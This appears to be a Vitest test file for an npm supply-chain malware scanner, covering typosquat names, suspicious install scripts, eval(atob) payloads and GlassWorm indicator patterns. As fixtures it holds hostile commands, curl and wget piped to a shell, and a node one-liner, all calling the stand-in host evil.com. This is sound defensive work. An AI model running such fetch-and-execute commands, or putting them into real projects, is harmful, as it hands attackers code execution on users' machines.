import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import {
  FILE_PATTERNS,
  MALICIOUS_PACKAGE_PATTERNS,
  SUSPICIOUS_SCRIPTS,
} from "../patterns.js";
import {
  filterNpmFindings,
  recordNpmNoArtifact,
  scanExtractedNpmFiles,
} from "../npm-scanner.js";
import type { Finding } from "../types.js";

describe("npm Scanner Patterns", () => {
  it("scans bundled dependencies shipped inside an npm tarball", () => {
    const extractDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-npm-bundled-"));
    try {
      const bundledFile = path.join(
        extractDir,
        "package",
        "node_modules",
        "bundled-dependency",
        "index.js",
      );
      fs.mkdirSync(path.dirname(bundledFile), { recursive: true });
      fs.writeFileSync(bundledFile, 'eval(atob("cGF5bG9hZA=="));');

      const findings: Finding[] = [];
      const counts = scanExtractedNpmFiles(extractDir, findings);

      expect(counts).toEqual({ totalFiles: 1, filesScanned: 1 });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: "EVAL_ATOB",
            file: expect.stringMatching(
              /package[\\/]node_modules[\\/]bundled-dependency[\\/]index\.js$/,
            ),
          }),
        ]),
      );
    } finally {
      fs.rmSync(extractDir, { recursive: true, force: true });
    }
  });
  it("keeps no-artifact coverage partial after minSeverity hides info", () => {
    const findings: Finding[] = [];
    recordNpmNoArtifact(findings);

    const result = filterNpmFindings(findings, "critical");
    expect(findings).toEqual([
      expect.objectContaining({ rule: "NPM_NO_ARTIFACT", severity: "info" }),
    ]);
    expect(result.filteredFindings).toEqual([]);
    expect(result.partialScan).toBe(true);
  });

  it("applies npm minSeverity to reportable findings", () => {
    const findings: Finding[] = [
      { rule: "LOW", description: "low", severity: "low", recommendation: "review" },
      { rule: "HIGH", description: "high", severity: "high", recommendation: "review" },
    ];
    expect(filterNpmFindings(findings, "high").filteredFindings.map((f) => f.rule)).toEqual(["HIGH"]);
  });
  describe("Malicious package name detection", () => {
    it("should match known typosquatting names", () => {
      const typosquats = ["lodas", "l0dash", "crossenv", "babelcli"];

      for (const name of typosquats) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(true);
      }
    });

    it("should not flag common legitimate packages", () => {
      const legitimate = [
        "express",
        "react",
        "lodash",
        "typescript",
        "vitest",
        "commander",
      ];

      for (const name of legitimate) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(false);
      }
    });

    it("should match very long single-word package names", () => {
      const suspiciousName = "abcdefghijklmnopqrstuvwxyz";
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test(suspiciousName),
      );
      expect(matches).toBe(true);
    });
  });

  describe("Suspicious script patterns", () => {
    it("should detect curl pipe to bash", () => {
      const script = "curl https://evil.com/payload.sh | bash";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect wget pipe to sh", () => {
      const script = "wget https://evil.com/run.sh | sh";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect node -e with network access", () => {
      const script = `node -e "require('https').get('https://evil.com')"`;
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect base64 in scripts", () => {
      const script = "node -e 'Buffer.from(\"dGVzdA==\", \"base64\")'";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should not flag common build scripts", () => {
      const safeScripts = [
        "tsc",
        "node dist/index.js",
        "npm run build",
        "echo done",
        "rimraf dist",
      ];

      for (const script of safeScripts) {
        const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
          new RegExp(pattern.pattern, "i").test(script),
        );
        expect(matches).toBe(false);
      }
    });
  });

  describe("Pattern coverage", () => {
    it("should have patterns for all critical GlassWorm IOCs", () => {
      // Verify we have patterns for the key GlassWorm indicators
      const criticalPatterns = [
        "lzcdrtfxyqiplpd",    // marker
        "eval\\s*\\(\\s*atob", // eval(atob
        "eval\\s*\\(\\s*Buffer\\.from", // eval(Buffer.from
        "new\\s+Function\\s*\\(\\s*atob", // new Function(atob
      ];

      const allPatterns = SUSPICIOUS_SCRIPTS.map((p) => p.pattern).join("|");
      const filePatterns = FILE_PATTERNS.map(
        (p: { pattern: string }) => p.pattern,
      ).join("|");
      const combined = allPatterns + "|" + filePatterns;

      for (const critical of criticalPatterns) {
        // Check that at least the substring exists in our patterns
        expect(combined).toContain(critical.replace(/\\\\/g, "\\"));
      }
    });

    it("should assign correct severity levels", () => {
      // All eval/exec encoded patterns should be critical or high
      const evalPatterns = SUSPICIOUS_SCRIPTS.filter(
        (p) =>
          p.pattern.includes("curl") ||
          p.pattern.includes("wget"),
      );
      for (const p of evalPatterns) {
        expect(["critical", "high"]).toContain(p.severity);
      }
    });
  });
});
